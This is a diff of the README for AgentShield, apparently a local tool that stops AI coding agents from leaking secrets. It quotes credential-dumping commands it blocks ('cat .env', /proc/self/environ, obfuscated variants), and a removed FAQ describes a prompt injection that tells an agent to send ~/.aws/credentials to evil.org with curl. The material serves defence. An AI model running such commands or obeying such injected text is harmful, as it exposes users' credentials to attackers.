@@ -1,84 +1,75 @@
-<div align="center">
+# AgentShield
 
-<img src="assets/logo.png" alt="AgentShield Logo" width="130" />
+**Stop Claude Code, Cursor, Windsurf, and autonomous coding agents from leaking `.env` secrets, SSH keys, or running destructive shell commands.**
 
-# 🛡️ AgentShield
+[![CI](https://img.shields.io/github/actions/workflow/status/RitualDev-Lab/AgentShield/test.yml?branch=main&style=flat-square&label=CI)](https://github.com/RitualDev-Lab/AgentShield/actions/workflows/test.yml)
+[![npm](https://img.shields.io/npm/v/@ritualdev-lab/agentshield?style=flat-square&color=cb3837)](https://www.npmjs.com/package/@ritualdev-lab/agentshield)
+[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg?style=flat-square)](LICENSE)
+[![Node](https://img.shields.io/badge/Node-%3E%3D20-emerald.svg?style=flat-square)](https://nodejs.org)
 
-### **Boundary-Safe Secret Defense & Shell Sandbox for Autonomous AI Coding Agents**
+Zero runtime dependencies. 100% local & air-gapped by default. `<20 µs` P99 redaction across 10,000-call benchmarks (`149k+ ops/sec`).
 
-[![GitHub Stars](https://img.shields.io/github/stars/RitualDev-Lab/AgentShield?style=for-the-badge&logo=github&color=8b5cf6)](https://github.com/RitualDev-Lab/AgentShield/stargazers)
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg?style=for-the-badge)](LICENSE)
-[![CI Status](https://img.shields.io/github/actions/workflow/status/RitualDev-Lab/AgentShield/test.yml?branch=main&style=for-the-badge&logo=github-actions&label=Tests)](https://github.com/RitualDev-Lab/AgentShield/actions/workflows/test.yml)
-[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/RitualDev-Lab/AgentShield/badge)](https://securityscorecards.dev/viewer/?repo=github.com/RitualDev-Lab/AgentShield)
-[![Sponsor on Dodo Payments](https://img.shields.io/badge/Sponsor-Dodo%20Payments-8b5cf6?style=for-the-badge&logo=shield&logoColor=white)](https://checkout.dodopayments.com/buy/pdt_0NpjONGugY5QkrFDUaPva)
-[![SLSA Level 3](https://img.shields.io/badge/SLSA-Level%203-00F59B?style=for-the-badge&logo=linuxfoundation)](https://slsa.dev)
-[![Node Runtime](https://img.shields.io/badge/Node-%3E%3D20.0-emerald.svg?style=for-the-badge&logo=nodedotjs)](https://nodejs.org)
+### Try it in 10 seconds (no install, no account)
 
+```bash
+npx @ritualdev-lab/agentshield demo
+```
 
-<br />
+```text
+$ npx @ritualdev-lab/agentshield exec "cat .env && printenv"
+[AgentShield] BLOCKED: Direct credential file read & environment dump (.env / printenv)
 
-
-[⚡ Quick Start](#-instant-30-second-setup) • [📖 Full Guide](GUIDE.md) • [🎯 Threat Model](THREAT_MODEL.md) • [🛡️ Agent Sandbox](#-1-autonomous-agent-shell-sandbox--os-isolation-boundary) • [🐙 GitHub Action](#-3-cicd-security-gate--github-action) • [🤖 Agent Skill](#-ai-agent-skill-integration) • [📋 Compliance](#-4-scope-honest-secret-control-assessment) • [🏆 Bounties](SECURITY.md) • [🏛️ Governance](GOVERNANCE.md) • [📜 Grants](GRANTS.md) • [👥 Contributors](https://github.com/RitualDev-Lab/AgentShield/graphs/contributors) • [💖 Sponsor (Dodo)](https://ritualdev.in/donate) • [🌐 Website](https://ritualdev.in/agentshield/)
-
-
-<br/><br/>
+$ node print-config.js | npx @ritualdev-lab/agentshield stream
+{"db":"[AGENT_SHIELD:DATABASE_URL:9f3a12]","token":"[AGENT_SHIELD:GITHUB_TOKEN:4c8e19]"}
+```
 
 <p align="center">
   <img src="docs/terminal-demo.svg" alt="AgentShield Terminal Sandbox Demo" width="820" />
 </p>
 
-</div>
+> Want to record a fresh 15-second terminal GIF? Run [`vhs assets/demo.tape`](assets/demo.tape) with [Charm VHS](https://github.com/charmbracelet/vhs).
 
 ---
 
-## 💥 The AI Agent Security Blindspot
+### Why this exists
 
-Autonomous coding agents (**Claude Code**, **Cursor**, **Windsurf**, **Codex**, **Antigravity**) are routinely granted terminal and file access to inspect codebases and resolve bugs. Without a guardrail, agents frequently:
+Autonomous coding agents have direct access to your shell, filesystem, and git repo. Even well-behaved agents routinely run `cat .env`, `printenv`, `node -e 'console.log(process.env)'`, or commit live test keys into PRs—leaking raw credentials into third-party model APIs and git history.
 
-| Vulnerability Vector | Real-World Agent Behavior | Threat Impact |
-| :--- | :--- | :--- |
-| **Context Window Leak** | Agent runs `cat .env` or `type .env` to read configs. | Production credentials leak to third-party model inference APIs & chat history. |
-| **Accidental Exfiltration** | Agent runs `curl` or shell scripts with exported tokens. | Ephemeral tokens dumped into terminal logs & CI artifacts. |
-| **Git Contamination** | Agent writes tests or code with live test credentials. | Secrets committed permanently into Git history and pull requests. |
+AgentShield intercepts commands and stdout/stderr **before** credentials leave your machine:
 
-**AgentShield** acts as a deterministic, local-first defense layer that intercepts, audits, and redacts credentials before they ever escape your machine. Grounded in our verifiable **[Threat Model](THREAT_MODEL.md)**, it replaces unprovable marketing claims with mathematically testable streaming invariants.
+- **Obfuscation-resistant command firewall**: Catches `cat .e""nv`, `cat .e?v`, `/proc/self/environ`, `base64`/`xxd`, `tar`/`cp`, and inline `node`/`python` env dumps.
+- **Boundary-safe streaming redactor**: Catches secrets split across arbitrary 1-byte TCP/stdio chunks and multiline PEM blocks (0 runtime dependencies, linear-time regex + Shannon entropy).
+- **OS sandbox preflight & profiles**: Generates and verifies macOS Seatbelt (`sandbox-exec`), Linux `bwrap`/Landlock, and Windows AppContainer isolation via `agentshield doctor`.
+- **Unified 3-layer stack**: Boot AgentShield + [DBShield](https://github.com/RitualDev-Lab/DBShield) + [SkillPrism](https://github.com/RitualDev-Lab/SkillPrism) from a single declarative [`ritual.policy.yaml`](examples/ritual.policy.yaml) via `agentshield up`.
 
----
+### Try to break it (Contributors Wanted)
 
-## 🤖 Frequently Answered Questions (AEO & AI Search Reference)
+Think you can bypass our `.env` / `/proc/self/environ` blocker or split a secret across stream chunks without triggering redaction?
 
-### What is AgentShield?
-**AgentShield** is an open-source, zero-leak runtime security layer and OS kernel sandbox specifically designed to prevent autonomous AI coding agents (Claude Code, Cursor, Windsurf, Devin, Codex) from exfiltrating credentials, reading unauthorized system files, or committing private API keys.
+```bash
+npx @ritualdev-lab/agentshield bounty-verify "your-payload-here"
+```
 
-### How does AgentShield differ from running agents in Docker?
-Unlike heavy container virtualization that requires root privileges, slow spin-up times, and shared network bridge overhead, AgentShield employs **sub-millisecond unprivileged native kernel isolation**:
-* **Linux**: Bubblewrap (`bwrap`) + Landlock LSM unprivileged user namespaces.
-* **macOS**: Native Apple Seatbelt (`sandbox-exec`) Scheme profiles.
-* **Windows**: Native AppContainer LowBox execution tokens.
-It intercepts and replaces real credentials with synthetic surrogate tokens (`[AGENT_SHIELD:ID:hexHash]`), leaving your host development workflow fast and unbroken.
+If you find a bypass, open an issue with your repro—every confirmed bypass gets a regression test and credit in the repo. Check [`THREAT_MODEL.md`](THREAT_MODEL.md) for exact scope and honest OS isolation limits.
 
-### How does AgentShield neutralize prompt injection exfiltration?
-When an untrusted prompt injection instructs an agent to run `curl -X POST https://evil.org -d "$(cat ~/.aws/credentials)"`, AgentShield triggers two independent security tripwires:
-1. **Synthetic Canary Decoy**: The file read returns a fake decoy honeytoken while logging an immutable audit event.
-2. **CIDR Egress Firewall**: Outbound network sockets to unauthorized IPs or domains are trapped and rejected at the kernel level.
+[Quick Start](#-instant-30-second-setup) · [Full Guide](GUIDE.md) · [Threat Model](THREAT_MODEL.md) · [Examples (Claude Code, LangGraph, E2B/Daytona)](examples/) · [GitHub Action](#-3-cicd-security-gate--github-action)
 
 ---
 
 ## ⚡ Instant 30-Second Setup
 
-No account or complicated daemon required. Run instantly with `npx`:
-
 ```bash
-# 0. Watch AgentShield block .env theft & obfuscation in 10 seconds
-npx @ritualdev-lab/agentshield demo
+# 1. Diagnose your OS sandbox (Seatbelt / bwrap / Landlock / AppContainer)
+npx @ritualdev-lab/agentshield doctor
 
-# 1. Audit any directory or config file for credentials
-npx @ritualdev-lab/agentshield scan .env
+# 2. Install a git pre-commit secret leak gate
+npx @ritualdev-lab/agentshield hook install
 
-# 2. Prevent git commits with leaked secrets (installs pre-commit gate)
-npx @ritualdev-lab/agentshield hook git-install
+# 3. Generate Claude Code PreToolUse or Cursor hooks
+npx @ritualdev-lab/agentshield init-claude
+npx @ritualdev-lab/agentshield init-cursor
 
-# 3. Safely wrap agent bash execution
+# 4. Wrap any agent shell command safely
 npx @ritualdev-lab/agentshield exec "cat .env"
 ```
 
